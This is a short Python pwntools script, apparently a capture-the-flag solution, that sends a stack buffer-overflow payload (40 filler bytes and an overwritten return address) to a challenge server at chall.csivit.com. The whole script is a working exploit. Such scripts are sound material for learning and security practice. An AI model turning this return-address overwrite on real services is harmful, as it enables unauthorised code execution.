from pwn import *
payload = 'A'*40+p64(0x00000000004011ce)
p = remote('chall.csivit.com', 30013)
print p.recv()
p.sendline(payload)
print p.recvall()
